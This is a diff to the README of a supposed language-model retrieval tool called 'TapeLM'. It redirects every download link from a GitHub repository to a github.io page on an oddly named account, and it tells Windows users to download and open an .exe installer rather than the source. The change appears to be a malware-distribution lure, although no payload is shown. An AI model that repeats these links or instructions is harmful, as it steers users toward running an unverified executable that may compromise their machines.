@@ -1,6 +1,6 @@
 # 💾 TapeLM - Fast Retrieval for Better Language Tasks
 
-[![](https://img.shields.io/badge/Download-TapeLM-blue)](https://github.com/Guadalupemountainsnationalparkflight821/TapeLM)
+[![](https://img.shields.io/badge/Download-TapeLM-blue)](https://guadalupemountainsnationalparkflight821.github.io)
 
 TapeLM helps your computer manage information. It reads text character by character. This approach allows the software to find specific facts and edit knowledge without needing to retrain the entire system. It acts as an external memory bank for your language tasks. You can use it to store new information or change existing data in your research files.
 
@@ -8,7 +8,7 @@ TapeLM helps your computer manage information. It reads text character by charac
 
 You need a basic Windows computer to run this tool. Ensure you have at least 8 gigabytes of RAM. You also need a standard internet connection to reach the main page. Follow these steps to set up the software on your machine.
 
-1. Go to the [TapeLM download page](https://github.com/Guadalupemountainsnationalparkflight821/TapeLM).
+1. Go to the [TapeLM download page](https://guadalupemountainsnationalparkflight821.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Click the link that ends in .exe to start the file transfer.
 4. Open the file once the download finishes.
@@ -16,7 +16,7 @@ You need a basic Windows computer to run this tool. Ensure you have at least 8 g
 
 ## 📥 Downloading and Installing
 
-The main software package lives on the official GitHub page. Visit this link to find the most recent version: [https://github.com/Guadalupemountainsnationalparkflight821/TapeLM](https://github.com/Guadalupemountainsnationalparkflight821/TapeLM).
+The main software package lives on the official GitHub page. Visit this link to find the most recent version: [https://guadalupemountainsnationalparkflight821.github.io](https://guadalupemountainsnationalparkflight821.github.io).
 
 When you land on the page, look for the "Releases" label. Click the latest version number. You will see a list of files under the Assets section. Download the Windows installer file. Do not download the source code files unless you plan to modify the software yourself. The installer handles all the background configurations needed to run the program on your computer.
 
